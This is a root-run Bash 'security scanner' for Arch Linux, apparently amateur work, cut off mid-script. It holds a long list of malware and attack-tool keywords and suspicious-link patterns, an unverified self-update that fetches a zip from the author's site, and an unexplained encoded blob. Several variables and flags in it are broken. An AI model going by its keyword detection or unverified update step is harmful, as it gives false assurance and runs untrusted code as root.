#!/bin/bash


#WARNING!!!
# THIS SCRIPT IS DISTRIBUTED IN CLOSED SOURCE AND THE CODES ARE HIDDEN. ONLY DESIGNATED PERSONS WHO HAVE PURCHASED PAID PLANS CAN ACCESS THIS CODE. IF YOU HAVE ACCESSED AUDO SCANNER'S CODES BY DIFFERENT WAYS, PLEASE CONTACT US THROUGH DISCORD!
# Our Discord Server: [https://discord.gg/g4KBRZ5Ghz]

# AUDO SCANNER WAS DESIGNED ENTIRELY FOR THE ENDER COMMUNITY.
# THANK YOU FOR CHOOSING US!.
# WEB : [https://endertopluluk.com]

# --CODED BY FYKS--

script_surum="1.0"
web_son_surum=$(curl -s https://endertopluluk.com/xsu3rcgh2pb33u26w9upmtadeh2bbxaseyjb8rmzd1shuwdaxqbji4wvev0nyerhg8ouz5r2lzjesej4qnfm9c1vcseyv9yp4skx6ylt8srgq9jf8o76u4k9qj15ulwlp1jwpnpdch5d48qz1zjlcs | grep -oP 'Audo Scanner Version :\s*\K\d+\.\d+')



if [ -d "audo_bin" ]; then
    sarx " Önceki taramalardan kalan eski raporlar tespit edildi. Siliniyor."
    rm -r raporlar
    yslx " Eski raporlar silindi"
fi
mkdir raporlar

if [ "$EUID" -ne 0 ]; then
  echo "Bu script root yetkisi gerektirir. AUDO SCANNER"
  exit 1
fi

fx() {
    sleep "$@"
}

ascii_art=" █████╗ ██╗   ██╗██████╗  ██████╗           Audo Scanner V1
██╔══██╗██║   ██║██╔══██╗██╔═══██╗  [Security testing tool for Arch Linux]
███████║██║   ██║██║  ██║██║   ██║             @Fyks
██╔══██║██║   ██║██║  ██║██║   ██║         LICENSE : MIT
██║  ██║╚██████╔╝██████╔╝╚██████╔╝  Web - https://endertopluluk.com
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝

"

clear
yesil_renk="\e[32m"
kirmizi_renk="\e[31m"
reset_renk="\e[0m"
verileri_yedekle_ayar="$kirmizi_renk OFF$reset_renk"
riskli_port_taramasi_ayar="$yesil_renk ON $reset_renk"
bilgisayari_kapat_ayar="$kirmizi_renk OFF$reset_renk"
offline_mod_ayar="$kirmizi_renk OFF$reset_renk"

echo "$ascii_art"
echo -ne "\033]0;Audo Scanner | Home \a"

echo "#"
echo "[1] Start security test"
echo "[2] Check for AudoScanner updates"
echo "[3] Version & Release"
echo "[4] EnderCommunity website"
echo "[5] Settings"
echo ""
echo -e "$kirmizi_renk[6] Exit $reset_renk"
echo ""
read -p "Enter option >  " secenek

kalin=$(tput bold)
kirmizi=$(tput setaf 1)
yesil=$(tput setaf 2)
mavi=$(tput setaf 4)
sari=$(tput setaf 3)
sil=$(tput sgr0)


function yslx {
  echo -e "${kalin}${yesil}[$(date +'%Y-%m-%d %H:%M:%S')]${sil} + $1"
}

function mavx {
  echo -e "${kalin}${mavi}[$(date +'%Y-%m-%d %H:%M:%S')]${sil} - $1"
}

function sarx {
  echo -e "${kalin}${sari}[$(date +'%Y-%m-%d %H:%M:%S')]${sil} * $1"
}

function kirx {
  echo -e "${kalin}${kirmizi}[$(date +'%Y-%m-%d %H:%M:%S')]${sil} ! $1"
}


if [ "$secenek" == "4" ]; then
  xdg-open 'https://endertopluluk.com'
  elif [ "$secenek" == "3" ]; then
  echo "Audo Scanner | Current Version '$web_son_surum' "
  elif [ "$secenek" == "2" ]; then
  if [ "$script_surum" != "$web_son_surum" ]; then
    read -p "[!] A new update is available! You can update it by typing 'update': " guncel
    if [ "$guncel" == "update" ]; then
      echo "Old version: $script_surum"
      echo "New version: $web_son_surum"

      wget -O audo_scanner.zip https://endertopluluk.com/audoscannerzip6

      if [ $? -eq 0 ]; then
        sarx  " installing update..."
        fx 2
        unzip audo_scanner.zip
        mv audo_scanner audo_scanner_old
        mv audo_scanner_new audo_scanner
        rm audo_scanner.zip
        rm -r audo_scanner_old

        echo "[+] AUDO Scanner updated successfully."

      else
        echo "[-] An error occurred during AUDO Scanner update."
      fi
    else
      echo "[X] Update operation canceled."
    fi
  else
    echo "[+] Script is up to date."
  fi
elif [ "$secenek" == "1" ]; then
  clear
  if ! command -v nmap &> /dev/null; then
    mavx " A module is missing. Would you like to install it? (Y/N)"
    read -r yukle_cevap
    if [ "$yukle_cevap" == "Y" ] || [ "$yukle_cevap" == "y" ]; then
        yslx " Installed"
        sudo pacman -S nmap --no-confirm
        clear
    else
        kirx " Failed to load module, cannot continue."
        exit 1
    fi
fi

if ! command -v curl &> /dev/null; then
    mavx " A module is missing. Would you like to install it? (Y/N)"
    read -r yukle_cevap
    if [ "$yukle_cevap" == "Y" ] || [ "$yukle_cevap" == "y" ]; then
        yslx " Installed"
        sudo pacman -S curl --no-confirm
        clear
    else
        mavx "[-] Failed to load module, cannot continue."
        exit 1
    fi
fi

if ! command -v lynis &> /dev/null; then
    mavx " A module is missing. Would you like to install it? (Y/N"
    read -r yukle_cevap
    if [ "$yukle_cevap" == "Y" ] || [ "$yukle_cevap" == "y" ]; then
        yslx " Installed"
        sudo pacman -S lynis --no-confirm
        clear
    else
        mavx " Failed to load module, cannot continue."
        exit 1
    fi
fi

elif [ "$secenek" == "5" ]; then
 while true; do
    clear
    echo "$ascii_art"

    echo "                    /-------------------------Scan Settings-------------------------\ "
    echo -n "                    | [1] Take a system backup before security testing  | "
    echo -e "$verileri_yedekle_ayar        |"

    echo -n "                    | [2] Risky port scanning                           | "
    echo -e "$riskli_port_taramasi_ayar        |"

    echo -n "                    | [3] Shutdown after security testing               | "
    echo -e "$bilgisayari_kapat_ayar        |"

    echo -n "                    | [4] Offline mode                                  | "
    echo -e "$offline_mod_ayar        |"

    echo "                    \--------------------------AUDO-SCANNER---------------------------/"
    echo ""
    read -p "Enter your choice >  " secenkx


    case "$secenkx" in
        "3 on")
            bilgisayari_kapat_ayar="$yesil_renk ON $reset_renk"
            bilgisayari_kapat_ayarX="AÇIK"
            ;;
        "3 off")
            bilgisayari_kapat_ayar="$kirmizi_renk OFF$reset_renk"
            bilgisayari_kapat_ayarX="KAPALI"
            ;;
        "4 on")
            offline_mod_ayar="$yesil_renk ON $reset_renk"
            offline_mod_ayarX="AÇIK"
            echo "Enabled offline mode. Offline mode disables features that require an internet connection, such as exploit scanning."
            ;;
        "4 off")
            offline_mod_ayar="$kirmizi_renk OFF$reset_renk"
            offline_mod_ayarX="KAPALI"
            echo "[+] Offline mode off."
            ;;
        "2 on")
            riskli_port_taramasi_ayar="$yesil_renk ON $reset_renk"
            riskli_port_taramasi_ayarX="AÇIK"
            ;;
        "2 off")
            riskli_port_taramasi_ayar="$kirmizi_renk OFF$reset_renk"
            riskli_port_taramasi_ayarX="KAPALI"
            ;;
        "1 on")
            verileri_yedekle_ayar="$yesil_renk ON $reset_renk"
            ;;
        "1 off")
            verileri_yedekle_ayar="$kirmizi_renk OFF$reset_renk"
            ;;
        "back")
            break
            ;;
        *)
            echo "Invalid option! Please enter a valid choice."
            read -n 1 -s -r -p "Press any key to continue..."
            ;;
    esac
done

elif [ "$secenek" == "6" ]; then
  echo "Çıkılıyor..."
  exit 0
else
  echo -e "[$kirmizi_renk-$reset_renk] Geçersiz seçenek."
  exit 1
fi

if ! command -v wget &> /dev/null; then
    mavx " A module is missing. Would you like to install it? (Y/N"
    read -r yukle_cevap
    if [ "$yukle_cevap" == "Y" ] || [ "$yukle_cevap" == "y" ]; then
        yslx " Installed"
        sudo pacman -S wget --no-confirm
        clear
    else
        kirx " Failed to load module, cannot continue."
        exit 1
    fi
fi

  read -p "> Are you sure you want to start security testing? (y/n): " secenks


  if [ "$secenks" == "n" ]; then
    echo "'N' option selected. You are directed to the main menu."
    exit 1
  elif [ "$secenks" == "y" ]; then
    sarx  " Security tests begin..."
    baslangic_zamani=$(date +%s)
    echo -ne "\033]0;Audo Scanner | Security testing has started \a"
    fx 2
    clear


    read -p "Directory you want to scan (eg: /home/mehmet/Desktop/): " taranan_uzanti

    clear

echo "Security testing has begun! You can grab your tea and coffee and wait for the results!"
read -p "[?] Check for system updates? (Y/N) :" guncl

if [ "$guncl" == "Y" ] || [ "$guncl" == "y" ]; then
    sarx " Checking for updates"
    timeout 10s sudo pacman -Syu --noconfirm
    yslx " UPDATE IS OVER"
    fx 5
else
    yslx  " The update was skipped."
    fx 2
fi
    clear

    sarx " Security Scanning has started! [Checking for dangerous characters & traces of viruses]"
    echo -ne "\033]0;Audo Scanner | Security Scan \a"
    fx 5


    dosya_sayac=0
    fx 10

    vis=("discord_logger" "tokengrabber" "discord_webhook" "discordwebhookapi" "gettoken" "getoken" "crypter" "crypters" "systemd" "systemx" "gang-nuker" "gang" "binder" "vir" "checker" "__pyarmor__ " "/total" "$appdata" "Â½systemb" "rootkit" "trojan" "keylogger" "backdoor" "ransomware" "spyware" "adware" "malware" "worm" "exploit" "botnet" "rootshell" "exploitkit" "vulnerability" "cryptojacking" "payload" "zeroday" "dropper" "infostealer" "shadowroot" "obfuscator" "cryptobypass" "reverseshell" "filecloaker" "stealthloader" "elevatedpriv" "rootmasker" "polyroot" "darklink" "cryptostealer" "exfiltrace" "sandboxevasion" "filelockdown" "hiddenlistener" "kernelhooker" "memoryinjector" "regpersistence" "privilegeescalator" "exploitblocker" "cryptowhisp" "phantomshard" "vortexstrike" "nebuladark" "oblivioncloak" "soulshatter" "shadowveil" "corruptixis" "nightraven" "voidscythe" "entropyflare" "reveriespire" "darkcrimson" "nightshadebyte" "cipherquasar" "starlightnexus" "cognitronix" "hexafluxor" "synapticlabyrinth" "obsidianmaw" "occulticorruptor" "voidwhisperer" "cipherspecter" "xenomorphexodus" "netherfluxforge" "chaosmetamorph" "obfuscationoracle" "cryptodarkmatter" "necrodaemonium" "spectresentinel" "abyssalapocalypse" "phasmalparadox" "pariahpandemonium" "serpentineabyss" "eldritchmindmeld" "soulslayercipher" "arcaneanomaly" "mythosmiasma" "cryptosorceress" "nightmarereverie" "cryptoblackthorn" "abyssaldaemon" "occultwhisperer" "chthonicnexus" "voidshadowcaster" "necrocipher" "xenomorphsorcery" "paradoxicspellweaver" "darkmetamorphosis" "crypticmalevolence" "eldritchominous" "nightravencipher" "chaosfluxor" "etherealnightmare" "abyssalspecter" "enigmaticdread" "phantasmalsorcerer" "arcaneapocalypse" "cryptogrimoire" "soulstealercipher" "systemcore" "networkoptimizer" "securityshield" "dataintegrity" "softwaremanager" "systemguardian" "networkdefender" "dataprotect" "appcontroller" "cloudsecurity" "systemoptimizer" "antiviruspro" "systemmonitor" "datafortress" "appdefender" "cloudshield" "securitysuite" "firewallexpert" "malwaredetector" "systemadministrator" "wannacry" "conficker" "zeus" "mydoom" "blaster" "code-red" "i-love-you" "sasser" "nimda" "stormworm" "slammer" "sobig" "sobig" "melissa" "mytob" "klez" "bagle" "netbus" "nimba" "banbra" "bagle" "korgo" "zerocool" "mywife" "tequila" "fizzer" "randex" "sdbot" "sasser" "spybot" "nimda" "klez" "sobig" "stormworm" "mydoom" "blaster" "slammer" "conficker" "i-love-you" "acidko" "boaxxe" "brontok" "cijuga" "conficker" "downadup" "ember" "gator" "iloveyou" "katusha" "kraken" "mahdi" "mytob" "natas" "pate" "sasser" "sqlslammer" "stormworm" "stration" "virtob" "zlob" "zotob" "acidko" "boaxxe" "brontok" "cijuga" "conficker" "downadup" "ember" "gator" "iloveyou" "katusha" "kraken" "mahdi" "mytob" "natas" "pate" "sasser" "sqlslammer" "stormworm" "stration" "virtob" "zlob" "zotob" "blaster" "nimda" "mydoom" "klez" "code-red" "slammer" "sobig" "i-worm" "nimba" "lovgate" "blazefind" "vundo" "stormbot" "confickr" "welchia" "mywife" "witty" "klez-e" "elkern" "w32/sasser" "sdbot" "spybot" "darktequila" "blackshades" "ramnit" "zeus" "darkshadow" "cryptoghost" "malwarex" "cyberstrike" "infectora" "trojanix" "rootviper" "virusflare" "stealthspider" "datacorruptor" "phishingclaw" "ransomstrike" "spywarezone" "malicrypt" "webterror" "exploitblitz" "botnetrider" "vulnerashield" "cryptoheist" "wormwhisper" "intrusionbyte" "cryptosnare" "ransomhound" "endcrypter" "end.crypter" "datashredder" "reversenexis" "keylogmaster" "threatvortex" "tunnelraven" "zombieflux" "viralstrike" "hackproof" "infectowave" "cryptopulse" "trojanzephyr" "botnetblaze" "vulnereye" "exploitstorm" "spywareblitz" "stealthpulse" "malicore" "phishguard" "intrusix" "cryptowave" "virusflare" "rootblitz" "datacrusher" "darkshadow" "webterror" "malwarex" "cyberstrike" "XVirus" "ZCrypt" "RogueWare" "DarkBot" "CryoWorm" "HackMatic" "ByteLock" "InfestX" "NukeSpy" "ViralX" "NexusRat" "ToxicWorm" "attackcrypter" "BlitzByte" "RansomX" "CrimsonBot" "ShadowVX" "StealthRat" "CryptRaider" "EclipseX" "VenomRogue" "DeathBite" "PhantomWarp" "ZombieRush" "VenomFang" "BlazeWarp" "NukeStorm" "PandoraX" "ChaosMatic" "CyberThorn" "BlitzFury" "ReaperX" "VenomByte" "VenomStorm" "ScorpionX" "RapidByte" "ToxinByte" "InfernoX" "BlitzCrawler" "DarkFury" "PanicByte" "VenomBite" "VenomShock" "ShadowByte" "StealthFury" "VenomClaw" "RapidThorn" "BlazeStorm" "VenomMatic" "NukeFang" "CyberBite" "DarkShock" "DeathStorm" "ChaosThorn" "ZombieFury" "ToxicShock" "PhantomFury" "PandoraByte" "VenomFlare" "CyberShock" "VenomFlux" "VenomRush" "ScorpionFury" "RapidFury" "DarkMatic" "CyberMatic" "PanicMatic" "VenomMatic" "ChaosMatic" "ToxinMatic" "InfernoMatic" "BlitzMatic" "ShadowMatic" "StealthMatic" "RapidMatic" "VenomMatic" "CyberMatic" "DarkRaider" "VenomRaider" "PanicRaider" "ChaosRaider" "CyberRaider" "InfernoRaider" "BlitzRaider" "ShadowRaider" "StealthRaider" "RapidRaider" "VenomRaider" "DarkBot" "VenomBot" "PanicBot" "ChaosBot" "CyberBot" "InfernoBot" "BlitzBot" "ShadowBot" "StealthBot" "RapidBot" "VenomBot" "DarkRat" "VenomRat" "PanicRat" "ChaosRat" "CyberRat" "InfernoRat" "BlitzRat" "ShadowRat" "StealthRat" "RapidRat" "VenomRat" )

    pss=("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")
taranan_dosyalar=()

for file in "$taranan_uzanti"/*; do
  ((dosya_sayac++))
  yslx " Scanned File: '$file'"

  dosya_adi=$(basename "$file")
  dosya_uzunlugu=${#dosya_adi}

  if [ "$dosya_uzunlugu" -gt 25 ]; then
    for isaret in "${vis[@]}"; do
      if [[ "$dosya_adi" == *"$isaret"* ]]; then
        echo -ne "\033]0;Audo Scanner | Found : 1 \a"
        clear
        kirx " Potential malware detected: $file"
        read -p "Do you want to clear this? (Y/N): " silme_istegi
        if [ "$silme_istegi" == "Y" ] || [ "$silme_istegi" == "y" ]; then
          rm -f "$file"
          yslx " $dosya_adi removed."
        else
          echo "[X] The deletion has been cancelled."
        fi
      fi
    done
  fi

  if grep -E "http://click\.com|https://bit\.ly|https://iplogger\.com|https://grabify\.link/|https://maper\.info/|http://info\.com" "$file"; then
    echo -ne "\033]0;Audo Scanner | FOUND \a"
    kirx " Suspicious link detected! "
  fi

  taranan_dosyalar+=("$file")
done


  clear

  if [ -d "$taranan_uzanti" ]; then
    toplam_dosya=$(find "$taranan_uzanti" -type f | wc -l)
    sarx " Scanning for dangerous links & virus traces continues. Please wait..."
    fx 50
    yslx " TOTAL $total_file FILE SCANNED! | $taranan_uzanti"
    fx 5
  else
    kirx " Scan stopped: 'There is an error in the specified directory'| $taranan_uzanti"
  fi
    fx 1
    sarx " Checking for outdated software...."
    echo -ne "\033]0;Audo Scanner | Checking for outdated software \a"
    fx 3

    guncel_olmayan_yazilimlar=$(pacman -Qqu)

    if [ -n "$guncel_olmayan_yazilimlar" ]; then
      echo "Outdated software:"
      echo "$guncel_olmayan_yazilimlar" > raporlar/audo_outdated_software.txt
      yslx " Outdated software was saved in the 'audo_outdated_software.txt' file."
    else
      yslx " No outdated software found."
    fi


    sarx " The permissions of users other than root are checked..."
    echo -ne "\033]0;Audo Scanner | User control \a"

    while IFS=: read -r username password uid gid info home shell; do
      echo "Kullanıcı: $username"
      sudo -lU "$username"
      echo "--------------------------------------"
    done < /etc/passwd > raporlar/audo_user_authorities.txt
    yslx " Authorization checks have been completed and the results are saved in the 'audo_user_authorities.txt' file."

    fx 2

    sarx " The connections on your internet are being scanned. This process may take time."
    fx 10
    supheli_baglanti=$(netstat -tuln | grep -E "ESTABLISHED|SYN_SENT")

    if [ -n "$supheli_baglanti" ]; then
      echo "$supheli_baglanti" > raporlar/audo_sus_connections.txt
      yslx " Suspicious connections on your internet have been saved in the 'audo_sus_connections.txt' file."
    else
      echo "Scanned with Audo Scanner. No suspicious links found!" > raporlar/audo_sus_connections.txt
      yslx " There were no suspicious connections on your internet."
      fx 2
    fi

sarx " Suspicious Links in the System are detected with LYNIS..."
fx 10
rapor_dosyasi="raporlar/audo_sus_links1.txt"
( sudo lynis audit system --cron 2>&1 | grep -v "egrep: warning: egrep is obsolescent" > "$rapor_dosyasi" ) &

if grep -E "Warning: Suspicious process" "$rapor_dosyasi"; then
  kirx " WARNING : Suspicious links found:"
  grep "Warning: Suspicious process" "$rapor_dosyasi" > "$raporlar/audo_sus_links.txt"
else
  yslx " No suspicious links were found on your system."
  fx 3
fi

riskli_port_taramasi_ayarX="AÇIK"

if [ "$riskli_port_taramasi_ayarX" == "AÇIK" ]; then

echo -ne "\033]0;Audo Scanner | Dangerous port scanning has startedı \a"
sarx " Scanning dangerous ports in your IP address... This process may take time."
fx 5

local_ip_adresi=$(curl -s https://ipinfo.io/ip)

tehlikeli_portlar=("22" "23" "445" "3389" "80" "25" "443" "3306" "5432" "8" "25" "3306" "5432" "110" "6000" "1812" "6660" "6661" "6662" "6663" "6669" "6664" "6665" "6666" "6667" "6668" "5900" "161" "53" "389" "139" "143")

tehlikeli_portlar_listesi=""
fx 5
sarx  " Port scanning is still ongoing."
for port in "${tehlikeli_portlar[@]}"; do
  nc -z -v -w1 $local_ip_adresi $port 2>/dev/null
  if [ $? -eq 0 ]; then
    kirx " WARNING : Dangerous open ports have been detected on your IP address: $port"
    tehlikeli_portlar_listesi+="[!] A dangerous port has been detected as open on your IP address: $port"$'\n'
  fi
done
if [ -n "$tehlikeli_portlar_listesi" ]; then
  echo "" >> raporlar/audo_dangerous_ports.txt
  echo "Potentially dangerous open ports in IP:" >> raporlar/audo_dangerous_ports.txt
  echo "$tehlikeli_portlar_listesi" >> raporlar/audo_dangerous_ports.txt
  yslx " Potentially dangerous open ports on your IP address are recorded in the 'audo_dangerous_ports.txt' file."
  fx 3
else
  yslx  " 32 potentially dangerous ports on IP were tested."
  echo "--------Scanned with AudoScanner--------" > raporlar/audo_sus_baglantilar.txt
  echo "Dangerous ports are not open on IP!" > raporlar/audo_sus_baglantilar.txt

  yslx  " Dangerous ports are not open on IP!"
 fi
fi

offline_mod_ayarX="KAPALI"

if [ "$offline_mod_ayarX" == "KAPALI" ]; then
ex_ipadresi=$(curl -s https://ipinfo.io/ip)

sans_ipadresi=$(echo "$ex_ipadresi" | awk -F'.' '{print $1"."$2".xx.xx"}')

exploit_cikti="raporlar/audo_scanner_localhost_exploits.txt"
sarx " Detailed exploit scanning is performed from your IP address | Your IP Address: $sans_ipadresi"
fx 15
acik_portlar=$(nmap -p- $ex_ipadresi | grep -oP '\d+\/open' | cut -d'/' -f1)

exploitler=""
exploit_bulundu=false

sarx " Ports scanned. Data is being pulled from Exploit DB."
fx 3

for port in $acik_portlar; do
    exploit_bilgi=$(curl -s "https://www.exploit-db.com/search?q=$port" | grep -oP 'https://www.exploit-db.com/exploits/\d+')
    if [ -n "$exploit_bilgi" ]; then
        exploit_bulundu=true
        exploit_bilgi=$(curl -s "$exploit_bilgi")
        exploitler="$exploitler$exploit_bilgi\n"
        kirx " EXPLOIT HAS BEEN DETECTED IN YOUR IP ADDRESS! SCAN AND EXPLOIT INFORMATION WILL BE SAVED IN THE 'audo_scanner_localhost_exploits.txt' FILE. "
        fx 6
    fi
done


if [ "$exploit_bulundu" = false ]; then
    echo "--------Audo Scanner ile tarandı---------" > raporlar/audo_scanner_localhost_exploits.txt
    echo "There was no exploitation of your IP Address! " > raporlar/audo_scanner_localhost_exploits.txt

    yslx  " There was no exploitation of your IP Address!"
    fx 3
else
